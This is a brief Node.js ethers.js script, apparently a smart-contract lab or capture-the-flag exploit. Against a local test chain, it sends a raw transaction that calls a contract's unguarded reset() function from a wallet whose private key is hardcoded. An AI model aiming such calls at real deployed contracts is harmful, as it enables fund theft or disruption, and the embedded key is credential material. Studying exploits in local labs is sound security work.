
const fs = require("fs")
const ethers = require("ethers")
const { exec } = require("child_process")

const abi = [
    {
        "inputs": [],
        "stateMutability": "payable",
        "type": "constructor"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "_receiver",
                "type": "address"
            }
        ],
        "name": "mint",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "reset",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "stateMutability": "payable",
        "type": "receive"
    }
]

async function Attack() {
    // Attackerrm 
    console.log("start attack !!!")
    const provider = new ethers.JsonRpcProvider("http://localhost:8545")
    const Attack_Private_Key = "0x22b848b90cb455a72bc982994d52857bd3f25b9ee87a60e60d61311b24eb3282"
    var wallet = new ethers.Wallet(Attack_Private_Key, provider)
    console.log("Attacker address:", wallet.address)
    console.log("Before attack, attacker's balance is :", await provider.getBalance(wallet.address))
    console.log("Attacker info has been initialized");

    // Contract
    const contractAddress = "0x28f3d0723F6C7aD0a3cc078EfF5C5432Ac1062f2"

    const tx = {
        from: wallet.address,
        to: contractAddress,
        gas: 10000,
        gasLimit: 300000,
        data: '0xd826f88f'
    }

    const result = await wallet.sendTransaction(tx)
    await result.wait()

    // const contract = new ethers.Contract(contractAddress, abi, wallet)
    console.log("reset function has been use!");



}


async function main() {
    Attack()
}


main()



